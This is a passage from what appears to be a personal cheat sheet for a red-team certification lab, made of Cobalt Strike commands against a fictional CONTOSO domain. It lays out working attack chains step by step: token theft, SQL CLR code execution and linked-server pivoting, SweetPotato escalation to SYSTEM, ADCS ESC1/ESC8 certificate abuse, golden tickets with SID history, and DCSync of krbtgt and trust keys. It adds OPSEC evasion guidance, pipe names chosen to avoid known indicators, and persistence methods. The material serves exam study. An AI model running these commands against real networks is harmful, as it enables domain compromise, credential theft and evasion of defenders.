// Lab: CN=Database Admins, member: rsteel → sysadmin on lon-db-1 AND lon-db-2

// ── IMPERSONATE SYSADMIN [BEACON: wkstn-1 | USER: pchilds → rsteel] ──────────
beacon> ps    // find rsteel process (cmd.exe, mmc.exe)
beacon> steal_token <rsteel-pid>     // OPSEC-🟢SAFE
beacon> getuid                       // confirm CONTOSO\rsteel
beacon> sql-whoami lon-db-1          // now: sysadmin on lon-db-1 ✓

// ── CODE EXECUTION ON LON-DB-1 [BEACON: wkstn-1 | USER: rsteel] ──────────────
beacon> sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
beacon> sql-enableclr lon-db-1
beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
// Wait ~10s for SMB beacon to spawn in sqlservr.exe on lon-db-1

// ── LINK TO LON-DB-1 [BEACON: wkstn-1 | USER: pchilds OR rsteel] ─────────────
// pchilds has TGT → auto-requests cifs/lon-db-1 ticket for SMB auth
beacon> link lon-db-1 <SMB-PIPENAME>
// [+] established link to child beacon: 10.10.120.20

beacon> sql-disableclr lon-db-1     // clean up immediately after linking

// ── LATERAL MOVEMENT: LON-DB-1 → LON-DB-2 ────────────────────────────────────
// ⚠️ ALL sql-* commands below: [BEACON: wkstn-1 | USER: rsteel]
// ⚠️ DO NOT run from lon-db-1 mssql_svc beacon — mssql_svc = guest/public on lon-db-2 → 42000 error

beacon> sql-links lon-db-1                      // confirm LON-DB-2 linked server exists
beacon> sql-whoami lon-db-1 "" lon-db-2         // as rsteel: sysadmin ✓ | as mssql_svc: guest ✗
beacon> sql-checkrpc lon-db-1                   // LON-DB-2: is_rpc_out_enabled = 0
beacon> sql-enablerpc lon-db-1 lon-db-2         // enable RPC Out (OPSEC-🟠CAUTION — logged)
beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
// Wait ~10s for SMB beacon in lon-db-2 sqlservr.exe

// ── LINK TO LON-DB-2 [BEACON: lon-db-1 | USER: mssql_svc] ───────────────────
// ⚠️ MUST run from lon-db-1 beacon — lon-db-2 only reachable via lon-db-1 (separate network segment)
// Switch to lon-db-1 beacon in CS
beacon> link lon-db-2 <SMB-PIPENAME>
// [+] established link to child beacon: 10.10.120.25

// From wkstn-1 (rsteel) — clean up:
beacon> sql-disablerpc lon-db-1 lon-db-2

// ── PRIVESC: SYSTEM ON LON-DB-2 [BEACON: lon-db-2 | USER: mssql_svc] ─────────
// Switch to lon-db-2 CLR beacon
beacon> getuid    // CONTOSO\mssql_svc — has SeImpersonatePrivilege
beacon> cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\tcp-local_x64.exe
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
// PrintSpoofer method used — [+] Process created, enjoy!
beacon> connect localhost 1337    // link tcp-local SYSTEM beacon
// [+] established link — getuid → NT AUTHORITY\SYSTEM on lon-db-2 ✓
```

> ⚠️ **42000 permission error on lon-db-2:** Caused by running `sql-clr ... "" lon-db-2` from the lon-db-1 mssql_svc beacon. Fix: run from wkstn-1 as rsteel. Leftover hash in `sys.trusted_assemblies` is auto-cleaned by SQL-BOF on next attempt.
>
> ⚠️ **SMB listener pipe name:** Use custom name (not default `TSVCPIPE-*`). Lab used `TSVCPIPE-4b2f70b3-juan-...`.

---

## Phase 15 — ADCS Attacks

### ESC1 — Misconfigured Client Authentication Template

```cs
// Enumerate vulnerable templates
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet

// Request cert with Administrator UPN in SAN
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet

// Use cert to get Administrator TGT via PKINIT
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap

// Inject TGT and verify DA access
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[BASE64]
beacon> ls \\lon-dc-1\c$
```

### ESC8 — NTLM Relay to ADCS HTTP Endpoint

```cs
// Enumerate CA for ESC8 (HTTP endpoint, NTLM auth enabled)
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet

// Start SOCKS proxy
beacon> socks 1080 socks5

// Stop SMB to free port 445 for relay
beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
beacon> sc_stop lanmanserver
beacon> sc_stop srv2
beacon> sc_stop srvnet

// Redirect port 445 to attacker desktop (relay listener)
beacon> rportfwd_local 445 localhost 7445
beacon> powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445

// On Kali (via Docker + proxychains):
// ntlmrelayx.py → relay DC auth → ADCS HTTP → obtain DC cert
// Rubeus.exe asktgt /certificate:<dc-cert> → DC TGT → DCSync
```

---

## Phase 16 — Domain Trusts (Parent-Child)

Hop from child domain (DUBLIN) to parent domain (CONTOSO) via SID history injection.

```cs
// Enumerate trust
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
// trustDirection=3 BIDIRECTIONAL | trustAttributes=32 WITHIN_FOREST

// Get child domain SID
beacon> ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com --attributes objectSid

// Get parent Enterprise Admins SID
beacon> ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid

// DCSync child domain krbtgt (from child DA beacon)
beacon> dcsync dublin.contoso.com DUBLIN\krbtgt    // OPSEC-🟠CAUTION — logged on DC

// Forge golden ticket with SID history → Enterprise Admins of parent
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:<child-SID> /sids:<parent-EA-SID> /aes256:<krbtgt-hash> /outfile:C:\Users\Attacker\Desktop\golden

// Inject and access parent domain DC
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN].kirbi
beacon> run klist
beacon> ls \\lon-dc-1\c$
```

---

## Phase 17 — Forest Trusts

### Inbound Trust (we are trusted — our users can access foreign domain resources)

```cs
// Confirm inbound trust from CONTOSO (trustDirection=1 INBOUND = PARTNER trusts us)
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName

// DCSync rsteel (who has access to PARTNER via FSP group membership)
beacon> dcsync CONTOSO\rsteel

// Authenticate to PARTNER domain using rsteel's AES256 hash
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:<hash> /nowrap /opsec

// Request cross-realm TGT for PARTNER
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/PARTNER.COM /ticket:[CONTOSO-TGT] /dc:lon-dc-1 /nowrap

// Request service ticket in PARTNER (e.g. cifs/par-jmp-1)
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /ticket:[PARTNER-TGT] /dc:par-dc-1 /nowrap /ptt

// Access PARTNER resource
beacon> ls \\par-jmp-1\c$
```

### Outbound Trust (we are trusting — we can enumerate the trusted domain)

```cs
// Confirm outbound trust (trustDirection=2 OUTBOUND = we trust CONTOSO)
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName

// Get TDO object GUID (needed to DCSync a non-user object)
beacon> ldapsearch "(&(objectClass=trustedDomain)(trustPartner=contoso.com))" --attributes objectGuid

// DCSync the TDO to extract the inter-realm trust key
beacon> dcsync PARTNER\<TDO-GUID>                     // extracts RC4/AES trust key

// Authenticate as PARTNER$ to CONTOSO KDC using the trust key
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /rc4:<trust-key> /dc:lon-dc-1 /nowrap

// Enumerate CONTOSO via the trust TGT
beacon> make_token CONTOSO\PARTNER$ FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\partner-trust.kirbi
beacon> ldapsearch (samAccountType=805306368) --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes samAccountName,servicePrincipalName
```

---

## Exam Day Quick-Fire Commands

```
OPSEC TIERS:
  OPSEC-🟢SAFE:    inline-execute, ldapsearch, powerpick, steal_token, jump winrm64, krb_triage, krb_dump
  OPSEC-🟠CAUTION: execute-assembly, dcsync, make_token, sc_stop/start, sql-clr, kerberos_ticket_use
  OPSEC-🔴UNSAFE:  shell, powershell, run, jump psexec64, mimikatz direct

SITUATIONAL AWARENESS:
  beacon> getuid | process_browser | ppid <PID> | spawnto x64 %windir%\sysnative\werfault.exe

CREDENTIAL HARVEST:
  Kerberoast:   execute-assembly Rubeus.exe kerberoast /user:<svc> /nowrap
  AS-REP:       execute-assembly Rubeus.exe asreproast /format:hashcat
  TGT dump:     krb_dump /user:rsteel /service:krbtgt
  Token:        steal_token <pid>

LATERAL (preference order):
  steal_token <pid>  →  jump winrm64 <target> smb_custom  (retry once on ERROR_FILE_NOT_FOUND)
    → jump scshell64 <target> smb_custom  →  remote-exec winrm + staged payload  →  jump psexec64 🔴
  ⚠️ make_token alone = ERROR_LOGON_FAILURE on WinRM — use steal_token for auth
  ⚠️ winrm64 lands as user not SYSTEM — run getsystem if SYSTEM needed (steal_token fails from wsmprovhost)

DCSYNC (OPSEC-🟠CAUTION — logged on DC):
  beacon> dcsync CONTOSO\krbtgt
  beacon> dcsync CONTOSO\Administrator
  ⚠️ Requires DA or replication rights. SYSTEM machine account (lon-wkstn-1$) will get
     ERROR_DS_DRA_ACCESS_DENIED (0x000020f7). Must have DA beacon first.

PERSISTENCE:
  User-level:   COM hijack HKCU → Teams DLL (Phase 4)
  SYSTEM-level: WMI subscription → DNS beacon on gpupdate (Phase 6)

INJECT TGT:
  steal_token <pid>  →  kerberos_ticket_use <path>.kirbi  →  rev2self        // preferred (🟢SAFE)
  make_token DOMAIN\user FakePass  →  kerberos_ticket_use <path>.kirbi  →  rev2self  // fallback (🟠CAUTION Event 4648)
  ⚠️ make_token optional when beacon is SYSTEM — kerberos_ticket_use injects into SYSTEM session directly
  ⚠️ krb_dump luid: use /luid:3e7 NOT /luid:0x3e7 — Kerbeus-BOF rejects 0x prefix ("Invalid luid")
  ⚠️ kerberos_ticket_use requires FILE PATH — pasting raw base64 fails ("does not exist"). Write .kirbi first:
     [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\ticket.kirbi", [Convert]::FromBase64String("[B64]"))
  ⚠️ getsystem + execute-assembly = "No .NET runtime found" — rev2self before running execute-assembly

CLEANUP:
  rev2self | rm <kirbi-files> | sql-disableclr | sql-disablerpc
```

---

## Pre-Exam Go/No-Go Checklist

```
[ ] SSH to team server — Malleable C2 profile loaded docker logs clean
[ ] Artifact Kit rebuilt + ThreatCheck clean (no output)
[ ] Resource Kit rebuilt + ThreatCheck AMSI clean ("No threat found")
[ ] artifact.cna + resources.cna loaded in CS Script Manager
[ ] SA.cna loaded (CS-Situational-Awareness-BOF) — required before exam-recon.cna
[ ] Kerbeus-BOF kerbeus_cs.cna loaded — required for krb_triage/krb_dump
[ ] exam-recon.cna loaded AFTER SA.cna — confirms domain_recon_bulk + domain_recon_targeted available
[ ] HTTP listener live with masquerading Host header
[ ] SMB listener live with CUSTOM pipename — use dotnet-diagnostic-##### or ########-####-####-####-############
    DO NOT use: TSVCPIPE-* (CS default), mojo.* (documented IOC since 2019), msagent_*, postex_*, MSSE-*
[ ] Test beacon from workstation → Defender does NOT block
[ ] spawnto set to werfault.exe after first beacon
[ ] ppid set to explorer.exe PID
[ ] Read exam rules of engagement — identify off-limit hosts BEFORE touching anything
[ ] Persistence deployed before first break (COM hijack → WMI after privesc)
[ ] Never disable Defender or Windows Firewall
```
